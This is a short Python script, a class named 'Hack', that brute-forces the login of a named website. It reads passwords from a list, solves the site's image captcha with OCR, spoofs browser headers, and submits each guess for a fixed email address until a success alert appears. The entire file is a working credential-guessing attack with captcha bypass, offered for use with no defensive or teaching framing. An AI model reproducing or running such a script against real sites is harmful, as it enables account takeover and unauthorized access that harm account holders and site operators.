# encoding: utf-8
# using Python 3.5

import requests
from PIL import Image
import pyocr
import pyocr.builders
import io
import sys
import http.cookiejar as cookiejar

class Hack():
    def __init__(self, url, mail, passFile):
        self.url = url
        self.mail = mail
        self.passFile = passFile
        self.__initOcr()

    def __initOcr(self):
        # Initialization
        tools = pyocr.get_available_tools()
        if len(tools) == 0:
            print("No OCR tool found!")
            sys.exit(1)
        self.tool = tools[0]
        langs = self.tool.get_available_languages()
        self.lang = langs[1]

    def __ocr(self):
        captcha = self.session.get(r"http://awping.com/account/captcha.php").content
        image = io.BytesIO(captcha)
        txt = self.tool.image_to_string(
            Image.open(image),
            lang = self.lang,
            builder = pyocr.builders.TextBuilder()
        )
        print("Captcha: {}".format(txt))
        return txt.strip()

    def run(self):
        with open(self.passFile, 'r') as f:
            rawPasswd = f.readlines()
            f.close()
        for passwd in rawPasswd:
            passwd = passwd[:-1]
            print(passwd)
            resp = self.__login(passwd)
            if b"<script>alert(\'Right!\');</script>" in resp:
                return passwd
        return

    def __login(self, password):
        self.session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.23 Mobile Safari/537.36",
            "Host": "awping.com",
            "Origin": "http://awping.com",
            "Referer": "http://awping.com/account/login.php"
        }
        payload = {
            "mail": self.mail,
            "password": password,
            "captcha": self.__ocr()
        }
        resp = self.session.post(self.url, payload, headers)
        # print(resp.content)
        return resp.content

if __name__ == "__main__":
    url = "http://awping.com/account/login.php"
    mail = "test@awping.com"
    passFile = "passlist.txt"
    hack = Hack(url, mail, passFile)
    resp = hack.run()
    if resp:
        print("The password is: {}".format(resp))
